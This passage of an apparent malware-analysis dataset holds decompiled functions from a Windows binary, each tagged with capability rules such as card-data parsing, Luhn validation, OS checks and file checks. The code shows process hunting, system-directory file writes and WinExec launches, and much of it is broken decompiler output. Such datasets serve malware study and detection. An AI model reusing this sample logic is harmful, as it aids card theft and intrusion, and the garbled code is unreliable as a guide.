*arg_10h;\n                } while (bVar7);\n                if (bVar7) {\n                    return arg_8h;\n                }\n                arg_14h = puVar5[5];\n                arg_10h = puVar5[4];\n            }\n            arg_8h = arg_8h + 1;\n            puVar4 = puVar5;\n        } while (arg_8h <= pcVar2);\n    }\n    return NULL;\n}\n",
        "token_count": 491
    },
    "00402420": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00402420(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, int32_t arg_20h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_10ch;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00402950(arg_18h, arg_1ch, arg_8h, 0x20, arg_20h + 0x20);\n    fcn.00402950(arg_18h, arg_1ch, arg_ch, 0x20, arg_20h + 0x60);\n    fcn.00402950(arg_18h, arg_1ch, arg_10h, 0x20, arg_20h + 0xa0);\n    fcn.00402950(arg_18h, arg_1ch, arg_14h, 0x20, arg_20h + 0xe0);\n    iVar1 = fcn.004023d0();\n    if (iVar1 == -1) {\n        iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n        *(arg_20h + 0x120) = iVar1 % 5;\n    }\n    else {\n        *(arg_20h + 0x120) = iVar1;\n    }\n    var_10ch = 0;\n    puVar2 = &var_10bh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    var_4h = 0x104;\n    *(puVar2 + 2) = 0;\n    iVar1 = fcn.00402ed0(0x80000001, 0x4112b0, 0x4112dc, &var_8h, &var_10ch, &var_4h);\n    if ((iVar1 != 0) && (iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_10ch, 0x41132c),  iVar1 == 0)) {\n        *(arg_20h + 0x120) = *(arg_20h + 0x120) | 0x80;\n    }\n    return;\n}\n",
        "token_count": 559
    },
    "004025f0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040265a)\n\nbool fcn.004025f0(void)\n\n{\n    int32_t iVar1;\n    uint var_10ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0x104;\n    iVar1 = fcn.00402ed0(0x80000002, 0x411348, 0x411388, &var_8h, &var_10ch, &var_4h);\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.MSVCRT.dll__access)(&var_10ch, 0);\n        return iVar1 != -1;\n    }\n    return false;\n}\n",
        "token_count": 166
    },
    "00402750": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.00402750(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00404a40(0x411068);\n    if (iVar1 != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 74
    },
    "00402a60": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402b0d) overlaps instruction at (ram,0x00402b0a)\n// \n// WARNING: Removing unreachable block (ram,0x00402aaf)\n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.00402a60(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    bool bVar3;\n    uint var_80h;\n    uint var_60h;\n    uint var_40h;\n    uchar var_20h;\n    uint var_1fh;\n    \n    iVar1 = fcn.00402780();\n    if (iVar1 == 0) {\n        return false;\n    }\n    fcn.00402690();\n    iVar1 = fcn.00402c00(0x4110cc);\n    bVar3 = SBORROW4(iVar1, -1);\n    if (iVar1 != -1) {\n        return false;\n    }\n    fcn.00401850();\n    *0x42250c = 1;\n    if ((!bVar3) && (bVar3)) {\n        *0x42250c = 1;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    iVar1 = fcn.00402750();\n    if (iVar1 != 0) {\n        return false;\n    }\n    var_20h = 0;\n    var_80h._0_1_ = 0;\n    puVar2 = &var_1fh;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    var_60h._0_1_ = 0;\n    puVar2 = &var_80h + 1;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    var_40h._0_1_ = 0;\n    puVar2 = &var_60h + 1;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    puVar2 = &var_40h + 1;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    iVar1 = fcn.00403250(&var_80h, &var_60h, &var_20h, &var_40h);\n    if (iVar1 == 0) {\n        return false;\n    }\n    iVar1 = fcn.00403560(&var_20h);\n    if (iVar1 == 0) {\n        return false;\n    }\n    iVar1 = fcn.00403ac0(&var_80h, &var_60h, &var_20h, &var_40h);\n    return iVar1 != 0;\n}\n",
        "token_count": 823
    },
    "00402c00": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402c00(uint arg_8h)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_10ch;\n    int32_t hObject;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    iVar3 = (**0x4224f8)(2, 0);\n    if (iVar3 == -1) {\n        return 0xffffffff;\n    }\n    var_130h = 0x128;\n    puVar5 = &var_12ch;\n    hObject = iVar3;\n    for (iVar4 = 0x49; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    iVar4 = (**0x4224fc)(iVar3, &var_130h);\n    pcVar2 = _sym.imp.MSVCRT.dll__stricmp;\n    uVar1 = var_4h;\n    while( true ) {\n        var_4h = uVar1;\n        if (iVar4 == 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n            return uVar1;\n        }\n        iVar4 = (*pcVar2)(&var_10ch, arg_8h);\n        if (iVar4 == 0) break;\n        iVar4 = (**0x422500)(iVar3, &var_130h);\n        uVar1 = var_4h;\n    }\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n    return var_128h;\n}\n",
        "token_count": 398
    },
    "004033b0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004033b0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    iVar1 = fcn.00402c00(0x4110d4);\n    if (iVar1 == -1) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x40, 0, iVar1);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(arg_8h, iVar1, 0, 0, 0, 2);\n    iVar3 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)(uVar2);\n    if (iVar3 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n    return 1;\n}\n",
        "token_count": 212
    },
    "00403470": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0040351c) overlaps instruction at (ram,0x0040351b)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00403470(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint32_t unaff_EBX;\n    uint8_t *puVar2;\n    uint hObject;\n    \n    arg_8h_00 = (*_sym.imp.KERNEL32.dll_CreateFileA)();\n    if (arg_8h_00 == -1) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_WriteFile)();\n    if (iVar1 == 0) {\n        return 0;\n    }\n    puVar2 = (unaff_EBX >> 8 & 0xffff00) << 8 | unaff_EBX & 0xffff;\n    if (*0x422508 != 0) {\n        iVar1 = fcn.004033b0(arg_8h_00);\n        *0x422508 = iVar1 == 0;\n    }\n    if ((-1 < *0x422508) && (-1 >= *0x422508)) {\n        *puVar2 = *puVar2 & 0xc3;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    fcn.00402800(0, arg_8h_00);\n    if (*0x422508 == 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(arg_8h_00);\n    }\n    return 1;\n}\n",
        "token_count": 389
    },
    "00403ac0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403cca) overlaps instruction at (ram,0x00403cc1)\n// \n// WARNING: Removing unreachable block (ram,0x00403b87)\n// WARNING: Removing unreachable block (ram,0x00403b0b)\n// WARNING: Removing unreachable block (ram,0x00403b17)\n// WARNING: Removing unreachable block (ram,0x00403cef)\n// WARNING: Removing unreachable block (ram,0x00403cd4)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t fcn.00403ac0(int32_t param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t *piVar5;\n    bool bVar6;\n    uchar uVar7;\n    uint8_t uVar8;\n    uint8_t in_IF;\n    bool bVar9;\n    uint8_t uVar10;\n    uint uStack535;\n    uchar uStack276;\n    uchar auStack275 [259];\n    int32_t iStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    bVar9 = false;\n    puVar4 = &uStack535;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    *(puVar4 + 2) = 0;\n    uVar10 = 0;\n    uVar8 = 0;\n    uVar7 = 1;\n    uStack276 = 0;\n    puVar4 = auStack275;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    iStack16 = 1;\n    piVar1 = puVar4 + 3;\n    *(puVar4 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    (*_sym.imp.MSVCRT.dll_sprintf)(&uStack276);\n    if ((!uVar7) && (uVar7)) {\n        uVar10 = ((uVar10 & 1) * 0x800 & 0x800) != 0;\n        bVar9 = ((in_IF & 1) * 0x200 & 0x400) != 0;\n        uVar8 = (uVar8 * -0x80 | (uVar7 & 1) * '@' & 0x80) != 0;\n    }\n    iVar3 = fcn.00401e90(0xf8, 0xf4);\n    piVar5 = piVar1;\n    if ((uVar10 == uVar8) && (uVar10 != uVar8)) {\n        out(0xc4, iVar3);\n        bVar9 = false;\n        piVar5 = puVar4 + 7;\n        *piVar1 = iVar3;\n    }\n    iVar3 = fcn.00402f80(param_1, param_2, param_3, param_4, uStack8, uStack12);\n    if (iVar3 == 0) {\n        return 0;\n    }\n    *0x422508 = fcn.004025f0();\n    iVar3 = fcn.00403470(&uStack276, uStack8, uStack12);\n    if (iVar3 == 0) {\n        return 0;\n    }\n    fcn.00402330();\n    iVar3 = fcn.00402c00(0x4110c0);\n    if (iVar3 == -1) {\n        iVar2 = fcn.00402c00(0x4110b4);\n        bVar6 = iVar2 != -1;\n        iVar3 = param_1;\n        if (iVar2 == -1) goto code_r0x00403cb1;\n        iVar3 = 0xf;\n    }\n    else {\n        iVar3 = 0xe;\n    }\n    iVar2 = fcn.00401000(param_1);\n    if (iVar2 != 0) {\n        fcn.00404b80(iVar3);\n        fcn.00402ec0(iVar3);\n        return 1;\n    }\n    bVar6 = false;\n    if (*0x422508 == 0) {\n        return 0;\n    }\ncode_r0x00403cb1:\n    if ((!bVar6) && (bVar6)) {\n        *(iVar3 + 0x43d1773a) = *(iVar3 + 0x43d1773a) ^ 0x8d27e95e;\n        LOCK();\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    iVar2 = fcn.00403a30(param_1, &uStack276);\n    // WARNING: Bad instruction - Truncating control flow here\n    iVar3 = iStack16;\n    if (iVar2 == 0) {\n        iVar3 = 0;\n    }\n    if (iVar3 != 0) {\n        *piVar5 = iVar3 + 4 + bVar9 * -8;\n        iVar2 = fcn.004025a0(param_1);\n        iVar3 = -0x7a4713bc;\n        if (iVar2 == 0) {\n            iStack16 = 0;\n            iVar3 = iVar2;\n        }\n    }\n    if (iVar3 == 0) {\n        iVar3 = fcn.004030d0(param_1, 0);\n        iStack16 = iVar3;\n    }\n    if (iVar3 != 0) {\n        fcn.00402ec0(0xffffffff);\n    }\n    (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n    (*_sym.imp.KERNEL32.dll_WinExec)(0xd4, 0);\n    return iVar3;\n}\n",
        "token_count": 1383
    },
    "00404e30": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404e5b) overlaps instruction at (ram,0x00404e59)\n// \n\nint32_t __cdecl fcn.00404e30(uint arg_8h)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(arg_8h, 0);\n    bVar2 = iVar1 + 1 < 0;\n    if (iVar1 != -1) {\n        if ((bVar2) || (!bVar2)) {\n            iVar1 = 0;\n        }\n        return iVar1 + 0x5d5bc033;\n    }\n    return 1;\n}\n",
        "token_count": 158
    },
    "00403890": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681",
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040398f) overlaps instruction at (ram,0x0040398e)\n// \n\nuint __fastcall fcn.00403890(uint param_1, int32_t *param_2, char *param_3)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    uint8_t uVar3;\n    uint16_t uVar4;\n    uint32_t in_EAX;\n    uint uVar5;\n    char *pcVar6;\n    uint8_t uVar7;\n    int32_t unaff_EBX;\n    uint *puVar8;\n    uint *puVar9;\n    uint32_t unaff_ESI;\n    uint32_t *unaff_EDI;\n    uint8_t in_CF;\n    uchar in_PF;\n    uint8_t in_AF;\n    uchar in_ZF;\n    char in_SF;\n    char in_OF;\n    float10 in_ST0;\n    float10 in_ST1;\n    int32_t in_stack_5f9dff5f;\n    uint auStack28 [2];\n    \n    if ((!in_CF && !in_ZF) && (in_CF || in_ZF)) {\n        in_CF = 0;\n        in_OF = '\\0';\n        in_SF = (in_EAX & 0xe2f4cc58) < 0;\n        in_ZF = (in_EAX & 0xe2f4cc58) == 0;\n        in_PF = (POPCOUNT(in_EAX & 0x58) & 1U) == 0;\n    }\n    *param_3 = '\\x13';\n    puVar9 = &stack0xfffffffc;\n    if ((in_PF) || (puVar9 = &stack0xfffffffc,  !in_PF)) {\ncode_r0x004038c9:\n        param_3[1] = '\\\"';\n        if (((in_OF == in_SF) && (in_OF != in_SF)) || (param_3[2] = -0x6e,  !in_PF)) {\n            *(param_3 + -0x7ce92414) = in_ST0;\n            uVar3 = param_3 + -1;\n            uVar7 = 9 < (uVar3 & 0xf) | in_AF;\n            uVar3 = uVar3 + uVar7 * '\\x06';\n            param_3 = param_3 + -1 & 0xffffff00 | uVar3 + (0x90 < (uVar3 & 0xf0) | in_CF | uVar7 * (0xf9 < uVar3)) * '`'\n            ;\n            *param_2 = *param_2 + 0x40c6df84;\n            uVar7 = param_2 + *(param_2 + -0x2474e586);\n            param_2 = param_2 & 0xffffff00 | uVar7;\n            in_ZF = uVar7 == 0;\n            in_PF = (POPCOUNT(uVar7) & 1U) == 0;\n            in_ST0 = in_ST1;\n            if (in_PF) {\n                puVar8 = &stack0xffffffe8;\n                cVar2 = '\\x1e';\n                do {\n                    puVar9 = puVar9 + -1;\n                    puVar8 = puVar8 + -1;\n                    *puVar8 = *puVar9;\n                    cVar2 = cVar2 + -1;\n                } while ('\\0' < cVar2);\n                uVar5 = in(0x78);\n                return uVar5;\n            }\n        }\n        param_3[3] = -0x62;\n        if ((!in_PF) && (in_PF)) {\n            puVar8 = &stack0xffffffec;\n            cVar2 = '\\x1e';\n            do {\n                puVar9 = puVar9 + -1;\n                puVar8 = puVar8 + -1;\n                *puVar8 = *puVar9;\n                cVar2 = cVar2 + -1;\n            } while ('\\0' < cVar2);\n            uVar5 = in(0x78);\n            return uVar5;\n        }\n        param_3[4] = -0x2b;\n        if (!in_PF) goto code_r0x00403928;\ncode_r0x0040393d:\n        param_3[5] = -0x30;\n        if ((in_ZF) || (!in_ZF)) goto code_r0x00403959;\n        param_3 = param_3 & 0xffffff00 | *0x4bb148d3;\n    }\n    else {\n        uVar1 = *unaff_EDI;\n        *unaff_EDI = unaff_ESI;\n        puVar9 = &stack0xfffffffc + -in_stack_5f9dff5f;\n        if (puVar9 < 0) {\n            *unaff_EDI = *(uVar1 + unaff_EBX);\n            sub.MSVCRT.dll_void___cdecl_operator_delete_void__();\n            return 1;\n        }\n        in_CF = 0;\n        in_OF = '\\0';\n        in_SF = uVar1 < 0;\n        in_ZF = uVar1 == 0;\n        in_PF = (POPCOUNT(uVar1 & 0xff) & 1U) == 0;\n        if (in_SF) goto code_r0x004038c9;\n        pcVar6 = uVar1 + 0x7ad50440 + param_3 * 8;\n        *pcVar6 = *pcVar6 + '\\x15';\n        in_ZF = *pcVar6 == '\\0';\n        in_PF = (POPCOUNT(*pcVar6) & 1U) == 0;\ncode_r0x00403928:\n        if (!in_PF) goto code_r0x0040393d;\n    }\n    puVar9 = *0xc617b43a;\n    pcVar6 = param_2 + 0x12840fd2;\n    *pcVar6 = *pcVar6 + pcVar6;\n    *0x34a96c7f = *0x34a96c7f + (pcVar6 >> 8);\n    uVar4 = pcVar6 * *0x34a96c7b;\n    pcVar6 = pcVar6 & 0xffff0000 | uVar4;\n    *unaff_EDI = in_ST0;\n    *pcVar6 = *pcVar6 + uVar4;\n    pcVar6[0x4bb148d3] = pcVar6[0x4bb148d3] + (uVar4 >> 8);\n    out(*0x34a96cf4, param_3);\n    param_3 = pcVar6;\ncode_r0x00403959:\n    param_3[6] = -0x16;\n    *(puVar9[2] + 7) = 0xab;\n    auStack28[1] = 0x403989;\n    uVar5 = func_0x10189901();\n    *(unaff_EBX + 0x5e5f0c4d) = 8;\n    return uVar5;\n}\n",
        "token_count": 1575
    },
    "00403f10": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489",
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403fdd) overlaps instruction at (ram,0x00403fdc)\n// \n\nbool fcn.00403f10(void)\n\n{\n    uint uVar1;\n    uchar extraout_CL;\n    uchar uVar2;\n    int32_t iVar3;\n    ushort uVar4;\n    uint *puVar5;\n    bool bVar6;\n    unkbyte6 Var7;\n    uchar uVar8;\n    uint uStack300;\n    uint uStack296;\n    uint uStack292;\n    uchar *puStack288;\n    uchar *puStack284;\n    uint *puStack280;\n    uchar uStack272;\n    uint uStack271;\n    uchar auStack12 [4];\n    uint uStack8;\n    \n    uStack272 = 0;\n    uStack8 = 0x104;\n    puVar5 = &uStack271;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    puStack280 = &uStack8;\n    puStack284 = &uStack272;\n    puStack288 = auStack12;\n    uStack292 = 0x4114e0;\n    uStack296 = 0x4114b8;\n    uStack300 = 0x80000002;\n    iVar3 = (*_sym.imp.SHLWAPI.dll_SHGetValueA)();\n    if (iVar3 != 0) {\n        return false;\n    }\n    uVar8 = 0;\n    Var7 = (*_sym.imp.MSVCRT.dll_strchr)();\n    uVar4 = Var7 >> 0x20;\n    bVar6 = Var7 == NULL;\n    if (bVar6) {\n        return false;\n    }\n    if (!bVar6) {\n        uVar8 = puVar5 + 3 >> 0x18;\n        if (bVar6) {\n            uVar1 = in(uVar4);\n            *(puVar5 + 3) = uVar1;\n            if (&uStack300 < 1) {\n                in(uVar4);\n                LOCK();\n                do {\n    // WARNING: Do nothing block with infinite loop\n                } while( true );\n            }\n            *0xdee00010 = *0xdee00010 + '\\x10';\n            uVar2 = extraout_CL;\n            goto code_r0x00403fe6;\n        }\n    }\n    uVar2 = 0xf0;\n    *Var7 = 0;\ncode_r0x00403fe6:\n    iVar3 = (*_sym.imp.MSVCRT.dll_atoi)(uVar2, uVar8);\n    if (iVar3 == 6) {\n        return true;\n    }\n    return iVar3 == 7;\n}\n",
        "token_count": 643
    },
    "00404bb0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.00404bb0(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    if (*0x42250c == 0) {\n        return 0;\n    }\n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1812, 0x104);\n    fcn.00403dd0(&uStack2112, 6);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, 0x41133c, acStack1304, &uStack2112);\n    uStack2088 = 0x4113c4;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x4113dc;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.004011f0(auStack1564, 0x411338, acStack1045 + 1, ~uVar3 - 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
        "token_count": 1869
    },
    "00402d20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402d57) overlaps instruction at (ram,0x00402d56)\n// \n\nulong __fastcall fcn.00402d20(char param_1, uint32_t param_2)\n\n{\n    char cVar1;\n    uint32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    char *unaff_EBX;\n    int32_t unaff_ESI;\n    bool in_CF;\n    ulong uVar4;\n    \n    uVar4 = CONCAT44(param_2, *0x422504);\n    if ((in_CF) || (!in_CF)) {\n        if (*0x422504 == 0) {\n            uVar3 = (*_sym.imp.MSVCRT.dll_time)(0);\n            uVar4 = (*_sym.imp.MSVCRT.dll_srand)(uVar3);\n            *0x422504 = 1;\n        }\n        return uVar4;\n    }\n    iVar2 = in_EAX + 1;\n    if (&stack0xfffffffc < *in_EAX || iVar2 == 0) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    if (-1 < iVar2) {\n        unaff_EBX[0x5b5e5fc7] = unaff_EBX[0x5b5e5fc7] + param_1;\n        return CONCAT44(param_2, in_EAX + 2);\n    }\n    cVar1 = *unaff_EBX;\n    *(unaff_ESI + 3) = *(unaff_ESI + 3) << 1;\n    return CONCAT44(param_2 & 0xffff0000 | CONCAT11((param_2 >> 8) - cVar1, param_2), iVar2);\n}\n",
        "token_count": 408
    },
    "00402f80": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
